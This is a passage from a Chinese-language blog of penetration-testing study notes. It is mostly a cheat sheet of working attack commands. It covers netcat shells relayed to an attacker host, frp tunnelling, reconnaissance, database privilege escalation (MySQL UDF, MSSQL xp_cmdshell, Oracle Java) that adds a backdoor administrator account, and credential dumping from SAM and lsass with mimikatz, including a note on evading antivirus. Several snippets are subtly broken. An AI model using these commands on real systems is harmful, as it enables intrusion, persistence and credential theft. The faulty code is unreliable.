    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>接触安全数月有余，整理一下内网学习笔记。</p><h2 id="0x01-内网穿透"><a href="#0x01-内网穿透" class="headerlink" title="0x01 内网穿透"></a>0x01 内网穿透</h2><h4 id="nc内网穿透"><a href="#nc内网穿透" class="headerlink" title="#nc内网穿透"></a>#nc内网穿透</h4><p>&#x2F;&#x2F;攻击机执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;目标机执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">3333</span> -e c:\windows\system32\cmd.exe<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;中间机执行  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -v 攻击机ip <span class="hljs-number">3333</span> -e “nc -v 目标机ip <span class="hljs-number">3333</span>”<br></code></pre></td></tr></table></figure><h4 id="frp内网穿透配置"><a href="#frp内网穿透配置" class="headerlink" title="#frp内网穿透配置"></a>#frp内网穿透配置</h4><p>&#x2F;&#x2F;内网机器上安装frpc，并修改 frpc.ini：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">101.120</span>.<span class="hljs-number">252.139</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">12345</span><br><span class="hljs-attr">token</span> = setyourowntoken<br><span class="hljs-attr">tcp_mux</span> = <span class="hljs-literal">true</span><br><br><span class="hljs-section">[web]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">8080</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;外网服务器上安装frps。 并修改 frps.ini：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">12345</span><br><span class="hljs-attr">log_file</span> = ./frps.log<br><span class="hljs-comment"># debug, info, warn, error</span><br><span class="hljs-attr">log_level</span> = info<br><span class="hljs-attr">log_max_days</span> = <span class="hljs-number">3</span><br><span class="hljs-comment"># auth token</span><br><span class="hljs-attr">token</span> = setyourowntoken<br><span class="hljs-attr">max_pool_count</span> = <span class="hljs-number">50</span><br><span class="hljs-attr">tcp_mux</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">subdomain_host</span> = some.domain.com<br></code></pre></td></tr></table></figure><h4 id="花生壳内网穿透"><a href="#花生壳内网穿透" class="headerlink" title="#花生壳内网穿透"></a>#花生壳内网穿透</h4><p>官网参考：<a href="https://link.zhihu.com/?target=https://hsk.oray.com/">https://hsk.oray.com/</a></p><h4 id="Cloudflare-argo-tunnel"><a href="#Cloudflare-argo-tunnel" class="headerlink" title="# Cloudflare argo tunnel"></a># Cloudflare argo tunnel</h4><p>官网参考： <a href="https://link.zhihu.com/?target=https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup">https://developers.cloudflare.com</a></p><h2 id="0x02-内网信息收集"><a href="#0x02-内网信息收集" class="headerlink" title="0x02 内网信息收集"></a>0x02 内网信息收集</h2><p>内网渗透测试核心就是信息收集。对测试目标的了解越多，测试越容易进行。</p><h3 id="2-1当前主机信息收集"><a href="#2-1当前主机信息收集" class="headerlink" title="2.1当前主机信息收集"></a>2.1当前主机信息收集</h3><p>在主机上信息收集主要包括<strong>操作系统、权限、内网ip地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话</strong>等。</p><p>&#x2F;&#x2F;用户列表</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span>          <span class="hljs-title">#分析本机用户列表</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;本机服务</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">wmic service list brief</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;进程列表</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">tasklist</span> /<span class="hljs-keyword">svc</span>    <span class="hljs-comment">//主要分析软件、邮件客户端、VPN和杀毒软件等进程</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;会话显示</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> session<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;端口列表</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">netstat -ano     <span class="hljs-regexp">//</span>查看端口列表、本机开放的端口所对应的服务和应用程序<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;补丁列表</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">wmic qfe <span class="hljs-keyword">get</span> Caption.Description,HotFixID,InstalledOn  <br><span class="hljs-comment">//会显示补丁的名称、描述、ID、安装时间等信息（也可以通过systeminfo看补丁信息）</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;共享列表</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> share<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;软件安装信息</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">wmic product <span class="hljs-built_in">get</span> name,<span class="hljs-built_in">version</span>      <span class="hljs-comment"> //分析杀毒软件</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;还原防火墙墙</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netsh advfirewall reset</span><br></code></pre></td></tr></table></figure><h3 id="2-2域内存活主机探测"><a href="#2-2域内存活主机探测" class="headerlink" title="2.2域内存活主机探测"></a>2.2域内存活主机探测</h3><h4 id="NetBIOS协议快速探测内网"><a href="#NetBIOS协议快速探测内网" class="headerlink" title="#NetBIOS协议快速探测内网"></a><strong>#NetBIOS协议快速探测内网</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nbt</span>.exe <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>Token含义：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata">SHARING       存在正在运行的文件和打印共享服务，但不一定有内容共享<br>DC            可能是域控制器<br><span class="hljs-keyword">U</span>=USER        登录名为User的用户（可能会存在误报）<br><span class="hljs-keyword">IIS</span>           可能安装<span class="hljs-keyword">IIS</span>服务器<br>EXCHANGE      可能安装了Exchange<br><span class="hljs-keyword">NOTES</span>         可能安装了Lotus <span class="hljs-keyword">Notes</span>电子邮件客户端<br>?             没有识别出NetBIOS资源<br></code></pre></td></tr></table></figure><h4 id="ICMP协议快速探测内网"><a href="#ICMP协议快速探测内网" class="headerlink" title="#ICMP协议快速探测内网"></a>#ICMP协议快速探测内网</h4><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">for</span> /<span class="hljs-keyword">L</span> <span class="hljs-built_in">%I</span> in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) <span class="hljs-keyword">DO</span> @ping -<span class="hljs-keyword">w</span> <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span>.<span class="hljs-built_in">%I</span> | findstr <span class="hljs-string">&quot;TTL=&quot;</span><br><span class="hljs-comment">//该命令表示循环ping探测整个c段</span><br></code></pre></td></tr></table></figure><h4 id="ARP扫描探测内网"><a href="#ARP扫描探测内网" class="headerlink" title="#ARP扫描探测内网"></a>#ARP扫描探测内网</h4><p>1.直接上传arp.exe</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">arp</span>.exe -t <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>2.Empire使用arpscan模块</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemodule situational_awareness<span class="hljs-regexp">/network/</span>arpscan<br></code></pre></td></tr></table></figure><p>3.Nishang使用Invoke-ARPScan.ps1脚本<br>将脚本上传到目标主机中运行（也可以输入命令远程加载脚本）</p><h4 id="TCP-x2F-UDP端口探测内网"><a href="#TCP-x2F-UDP端口探测内网" class="headerlink" title="#TCP&#x2F;UDP端口探测内网"></a>#TCP&#x2F;UDP端口探测内网</h4><p>ScanLine中TCP&#x2F;UDP端口扫描</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">scanline</span> -h -t <span class="hljs-number">22</span>,<span class="hljs-number">80</span>-<span class="hljs-number">89</span>,<span class="hljs-number">110</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">1099</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">2049</span>,<span class="hljs-number">6379</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">5432</span> -u <span class="hljs-number">53</span>,<span class="hljs-number">161</span>,<span class="hljs-number">137</span>,<span class="hljs-number">139</span> -O c:\windows\temp\log.txt -p <span class="hljs-number">192.168.1.1</span>-<span class="hljs-number">254</span> /b<br></code></pre></td></tr></table></figure><p>tips：可以在<strong>白天和晚上</strong>分别进行探测，进而对比存活主机和对应的ip地址。</p><h3 id="2-3端口扫描"><a href="#2-3端口扫描" class="headerlink" title="2.3端口扫描"></a>2.3端口扫描</h3><h4 id="telnet命令进行扫描"><a href="#telnet命令进行扫描" class="headerlink" title="#telnet命令进行扫描"></a>#telnet命令进行扫描</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">telnet DC [端口号]<br><span class="hljs-regexp">//</span>适用于探测某个常规高危端口是否开放<br></code></pre></td></tr></table></figure><h4 id="Metasploit端口扫描"><a href="#Metasploit端口扫描" class="headerlink" title="#Metasploit端口扫描"></a>#Metasploit端口扫描</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp<br></code></pre></td></tr></table></figure><p>提供多种端口扫描技术，可以通过下面的命令进行搜索</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">search portscan</span>  <br></code></pre></td></tr></table></figure><h4 id="Nishang模块进行扫描"><a href="#Nishang模块进行扫描" class="headerlink" title="#Nishang模块进行扫描"></a>#Nishang模块进行扫描</h4><p>Invoke-PortScan是Nishang的端口扫描模块，可以发现主机，解析主机名，扫描端口。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Invoke</span>-PortScan -StartAddress <span class="hljs-number">192.168.250.1</span> -EndAddress <span class="hljs-number">192.168.250.255</span> -ResolveHost<br></code></pre></td></tr></table></figure><h2 id="0x03-权限提升"><a href="#0x03-权限提升" class="headerlink" title="0x03 权限提升"></a>0x03 权限提升</h2><p><strong>最高权限：</strong></p><ul><li><strong>Windows：system（TrustedInstaller不常用）</strong></li><li><strong>Linux：root</strong></li></ul><h3 id="Windows（只提3种）"><a href="#Windows（只提3种）" class="headerlink" title="Windows（只提3种）:"></a><strong>Windows（只提3种）:</strong></h3><h4 id="系统内核溢出"><a href="#系统内核溢出" class="headerlink" title="#系统内核溢出"></a>#系统内核溢出</h4><p>&#x2F;&#x2F;确定补丁的个数和种类 寻找提权exp编号</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systeminfo</span> <br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;查看端口和进程和服务 查询杀软防护 寻找exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /svc<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;利用Metasploit的模块发现缺失补丁 </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use post<span class="hljs-regexp">/windows/g</span>ather/enum_patches<br></code></pre></td></tr></table></figure><h4 id="数据库提权"><a href="#数据库提权" class="headerlink" title="#数据库提权"></a>#数据库提权</h4><p><strong>mysql</strong>（利用udf提权）</p><ul><li><p>只有在root权限下</p></li><li><p>上传udf.dll文件（如果mysql版本&gt;5.1.就要将udf.dll文件放入mysql&#x2F;lib&#x2F;plugin（可以自己创建文件夹），如果版本&lt;5.1，就要将文件放入c盘Windows下面） </p><p>&#x2F;&#x2F;通过密码连接数据库</p><p>（翻数据库文件，连接密码一般存在于inc&#x2F;config里面）</p><p>&#x2F;&#x2F;创建数据表连接数据库以后操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> udfeval（shellcode longblob）<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;将udf文件放入数据库中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> udfeval <span class="hljs-keyword">values</span> （load_file（&quot;udf路径&quot;））<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;把创建表的信息导出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> shellload <span class="hljs-keyword">from</span> udfeval <span class="hljs-keyword">into</span> dumpfile “c:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>windows<span class="hljs-operator">/</span>udf.dll”<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;创建func函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> cmdshell <span class="hljs-keyword">return</span> string soname ‘udf.dll’<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;查找是否存在udf</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> func<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;查询权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> cmdshell（‘whoami’）<br></code></pre></td></tr></table></figure></li></ul><p><strong>mssql</strong>（利用xp_cmdshell）</p><ul><li><p>sa权限：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">找数据库配置文件config，查看数据库类型/权限/密码<br>查看当前权限，简单systeminfo查看补丁<br>补丁很多的情况下，通过密码连接数据库(sqlmap有<span class="hljs-attr">--os-shell</span>可以直接上线利用)<br>在数据库中打开xp_cmdshell调用exeo master<span class="hljs-selector-class">.dbo</span><span class="hljs-selector-class">.xp_cmdshell</span> <span class="hljs-string">&#x27;whoami&#x27;</span><br>创建账号exec master<span class="hljs-selector-class">.dbo</span><span class="hljs-selector-class">.xp_cmdshell</span> <span class="hljs-string">&#x27;net user hack hack/add&#x27;</span><br>将账号加入管理组才能正常登录exec master<span class="hljs-selector-class">.dbo</span><span class="hljs-selector-class">.xp_cmdshell</span> <span class="hljs-string">&#x27;net localgroup administrator hack/add &#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>普通权限：</p><p>查看服务是否存在sql server sgent服务（必须前提），输入文本代码，使回显成一个txt文件查看执行结果。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">USE msdb<br><span class="hljs-keyword">EXEC</span> sp_add_job <span class="hljs-variable">@job</span>_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;GetSystemOnSQL&#x27;</span>,<br><span class="hljs-variable">@enabled</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>,<br><span class="hljs-variable">@description</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;This will give a low privileged user access to xp_cmdshell&#x27;</span>,<br><span class="hljs-variable">@delete</span>_level <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">EXEC</span> sp_add_jobstep <span class="hljs-variable">@job</span>_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;GetSystemOnSQL&#x27;</span>,<br><span class="hljs-variable">@step</span>_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Exec my sql&#x27;</span>,<br><span class="hljs-variable">@subsystem</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;TSQL&#x27;</span>,<br><span class="hljs-variable">@command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;exec master..xp_execresultset N&#x27;&#x27;select &#x27;&#x27;&#x27;&#x27;exec master..xp_cmdshell &quot;net user hack hack /add&gt; c:\inetpub\wwwroot\results.txt&quot;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;,N&#x27;&#x27;Master&#x27;&#x27;&#x27;</span>  <br><span class="hljs-keyword">EXEC</span> sp_add_jobserver <span class="hljs-variable">@job</span>_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;GetSystemOnSQL&#x27;</span>,<br><span class="hljs-variable">@server</span>_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;NSF-BCF0F41&#x27;</span>    <br><span class="hljs-keyword">EXEC</span> sp_start_job <span class="hljs-variable">@job</span>_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;GetSystemOnSQL&#x27;</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>Oracle</strong></p><ol><li><p>查看配置文件</p></li><li><p>连接数据库，查看DBA权限select * from session_roles</p></li><li><p>通过文件代码创建java包，并且创建函数，进一步调用函数执行命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">or</span> replace <span class="hljs-keyword">and</span> compile<br>java source named &quot;Util&quot;<br><span class="hljs-keyword">as</span><br>import java.io.;<br>import java.lang.;<br>public class Util extends Object<br>&#123;<br>public <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> RunThis(String args)<br>&#123;<br>Runtime rt <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-type">int</span> rc <span class="hljs-operator">=</span> <span class="hljs-number">-1</span>;<br>try<br>&#123;<br>Process p <span class="hljs-operator">=</span> rt.exec(args);<br><span class="hljs-type">int</span> bufSize <span class="hljs-operator">=</span> <span class="hljs-number">4096</span>;<br>BufferedInputStream bis <span class="hljs-operator">=</span><br><span class="hljs-keyword">new</span> BufferedInputStream(p.getInputStream(), bufSize);<br><span class="hljs-type">int</span> len;<br>byte buffer[] <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> byte[bufSize];<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> Echo back what the program spit <span class="hljs-keyword">out</span><br>while ((len <span class="hljs-operator">=</span> bis.read(buffer, <span class="hljs-number">0</span>, bufSize)) <span class="hljs-operator">!=</span> <span class="hljs-number">-1</span>)<br>System.out.write(buffer, <span class="hljs-number">0</span>, len);<br>rc <span class="hljs-operator">=</span> p.waitFor();<br>&#125;<br>catch (Exception e)<br>&#123;<br>e.printStackTrace();<br>rc <span class="hljs-operator">=</span> <span class="hljs-number">-1</span>;<br>&#125;<br>finally<br>&#123;<br><span class="hljs-keyword">return</span> rc;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-operator">/</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">or</span> replace<br><span class="hljs-keyword">function</span> RUN_CMD(p_cmd <span class="hljs-keyword">in</span> varchar2) <span class="hljs-keyword">return</span> number<br><span class="hljs-keyword">as</span><br><span class="hljs-keyword">language</span> java<br>name <span class="hljs-string">&#x27;Util.RunThis(java.lang.String) return integer&#x27;</span>;<br><span class="hljs-operator">/</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">or</span> replace <span class="hljs-keyword">procedure</span> RC(p_cmd <span class="hljs-keyword">in</span> varchar2)<br><span class="hljs-keyword">as</span><br>x number;<br><span class="hljs-keyword">begin</span><br>x :<span class="hljs-operator">=</span> run_cmd(p_cmd);<br><span class="hljs-keyword">end</span>;<br><span class="hljs-operator">/</span><br>variable x number;<br><span class="hljs-keyword">set</span> serveroutput <span class="hljs-keyword">on</span><br><span class="hljs-keyword">exec</span> dbms_java.set_output(<span class="hljs-number">100000</span>);<br><span class="hljs-keyword">grant</span> javasyspriv <span class="hljs-keyword">to</span> CMS<br><span class="hljs-operator">/</span><br><span class="hljs-keyword">exec</span> :x:<span class="hljs-operator">=</span> RUN_CMD(<span class="hljs-string">&#x27;net user hack hacker /add&#x27;</span>);<br><span class="hljs-keyword">exec</span> :x:<span class="hljs-operator">=</span> RUN_CMD(<span class="hljs-string">&#x27;net localgroup administrators hack /add&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ol><h4 id="客户端软件提权"><a href="#客户端软件提权" class="headerlink" title="#客户端软件提权"></a>#客户端软件提权</h4><p>默认安装一些软件时，会给予最高权限，寻找这些软件文件夹。通过工具生成伪造的插件，重命名以替换原存在的插件。放入目录，等待程序重启即可添加账户。</p><h3 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h3><p>对于Linux操作系统，一般都是靠低版本的内核寻找exp进行提权，对于一些高版本的系统基本无解。因此，Linux系统较为安全。</p><h4 id="内核溢出"><a href="#内核溢出" class="headerlink" title="#内核溢出"></a>#内核溢出</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">uname -a<br><span class="hljs-regexp">//</span>查看内核版本 查找exp<br></code></pre></td></tr></table></figure><h2 id="0x04-横向渗透"><a href="#0x04-横向渗透" class="headerlink" title="0x04 横向渗透"></a>0x04 横向渗透</h2><h3 id="4-1获取散列值"><a href="#4-1获取散列值" class="headerlink" title="4.1获取散列值"></a>4.1获取散列值</h3><h4 id="通过SAM和System文件抓取密码"><a href="#通过SAM和System文件抓取密码" class="headerlink" title="#通过SAM和System文件抓取密码"></a>#通过SAM和System文件抓取密码</h4><p>导出SAM和System文件：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">reg <span class="hljs-built_in">save</span> hklm\sam sam.hive<br>reg <span class="hljs-built_in">save</span> hklm\<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.hive<br></code></pre></td></tr></table></figure><p>读取SAM和System文件获取NTLM Hash：</p><ul><li><p>使用mimikatz</p></li><li><p>使用Cain</p><p>…..</p></li></ul><h4 id="使用mimikatz读取"><a href="#使用mimikatz读取" class="headerlink" title="#使用mimikatz读取"></a>#使用mimikatz读取</h4><p>除了上面读取SAM文件，还可以离线读取lsass.dmp文件：</p><p>&#x2F;&#x2F;使用procdump导出lsass.dmp文件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;读取lsass.dmp文件的密码散列值sekurlsa::minidump lsass.DMP</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">sekurlsa<span class="hljs-type">::logonPasswords</span> <span class="hljs-literal">full</span><br></code></pre></td></tr></table></figure><p><u>注意：在目标机器使用mimikatz时，要考虑免杀。</u></p><h4 id="使用Hashcat获取"><a href="#使用Hashcat获取" class="headerlink" title="#使用Hashcat获取"></a>#使用Hashcat获取</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">hashcat -a 0 -m xx <span class="hljs-tag">&lt;<span class="hljs-name">hashfile</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">zidian1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">zidian2</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>-a 0:以字典模式破解</li><li>-m xx:指定<hashfile>内的散列值类型</hashfile></li><li><hashfile>:将多个散列值存入文本，等待破解</hashfile></li><li><zidian1><zidian2>：指定字典文件</zidian2></zidian1></li></ul><h3 id="4-2Windows远程连接"><a href="#4-2Windows远程连接" class="headerlink" title="4.2Windows远程连接"></a>4.2Windows远程连接</h3><h4 id="IPC"><a href="#IPC" class="headerlink" title="#IPC"></a>#IPC</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">100.190</span>\ipc<span class="hljs-variable">$ </span><span class="hljs-string">&#x27;Aa123456@&#x27;</span> /<span class="hljs-symbol">user:</span>administrator<br></code></pre></td></tr></table></figure><ul><li>开启了139、445端口</li><li>管理员开启了默认共享</li></ul><h3 id="4-3哈希传递"><a href="#4-3哈希传递" class="headerlink" 